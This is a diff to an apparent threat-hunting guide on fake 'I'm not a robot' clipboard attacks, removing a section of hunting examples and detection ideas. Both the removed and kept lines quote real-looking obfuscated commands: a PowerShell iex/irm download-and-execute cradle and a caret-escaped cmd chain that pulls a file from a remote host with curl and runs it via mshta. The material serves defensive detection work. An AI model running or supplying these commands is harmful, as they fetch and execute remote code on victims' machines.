@@ -222,35 +222,6 @@ Recent Red Canary telemetry shows that the stable indicator is **not one exact c
 - **Dynamic URL reconstruction**: `iex(irm(('ccud'+'mcx')+('.x'+'yz/u')))` avoids a static URL in the command line while still performing in-memory download-and-execute.
 - **Masqueraded installer execution**: `"C:\WINDOWS\system32\msIeXec.exe" -PAcKᵃGE http://... /Q` abuses unusual casing and Unicode-like characters in flags to break brittle detections while still resembling `msiexec.exe`.
 - **Caret-escaped LOLBin chains**: `cmd.exe` can hide keywords with `^` escapes (`s^t^a^r^t`, `^c^u^r^l^`, `^m^s^h^t^a^`), start the nested shell minimized, save attacker content with a benign extension such as `.pdf`, and then execute it through `mshta`.
-
-### Example traits worth hunting
-
-```cmd
-"PowerShell.exe" "Write-Host(&{iex(irm(('ccud'+'mcx')+('.x'+'yz/u')))})2>$null" # Security check ✔️ I'm not a robot Verification ID: 138105
-```
-
-- Runtime-built URL fragments instead of a plain IOC.
-- `irm` + `iex` for direct memory execution.
-- `2>$null` or similar stderr suppression to hide failures from the user.
-- Social-engineering text embedded directly in the command line.
-
-```cmd
-"cmd.exe" /c s^t^a^r^t "" /min C:\windows\system32\cmd.exe /c "(for /f "delims=" %E in ('echo C:\Users\username\AppData\Local\Voter.pdf') do ^c^u^r^l^ -skLo "%E" 35613analytics[.]com/uuu && ^m^s^h^t^a^ "%E")"
-```
-
-- `/min` reduces visible shell artifacts.
-- `curl -skLo` downloads silently, ignores certificate problems, and writes to an attacker-chosen path.
-- The saved name/extension is not a trust signal: `mshta` will still execute HTA/script content from a file named `.pdf`.
-- This is a high-signal `cmd.exe` → `curl` → `mshta` proxy-execution chain for detections.
-
-### Extra detection ideas for these variants
-
-- Correlate **browser interaction or clipboard-write telemetry** with `explorer.exe` spawning `powershell.exe`, `cmd.exe`, `msiexec.exe`, or `mshta.exe` within seconds.
-- Flag command lines containing **verification-themed comments/strings** together with shell metacharacters, PowerShell cradles, or LOLBins.
-- Hunt for **unusual casing** of Windows binaries and for **Unicode/confusable characters** inside switches (for example `-PAcKᵃGE`).
-- Alert when `mshta.exe` opens files from **user-writable paths** with misleading extensions, or when `cmd.exe /min` immediately launches download-and-execute logic.
-- Treat `curl` POSTs with custom headers plus markers such as `event=pasted` as strong campaign telemetry rather than benign CLI usage.
-
 ## Mitigations
 
 1. Browser hardening – disable clipboard write-access (`dom.events.asyncClipboard.clipboardItem` etc.) or require user gesture.
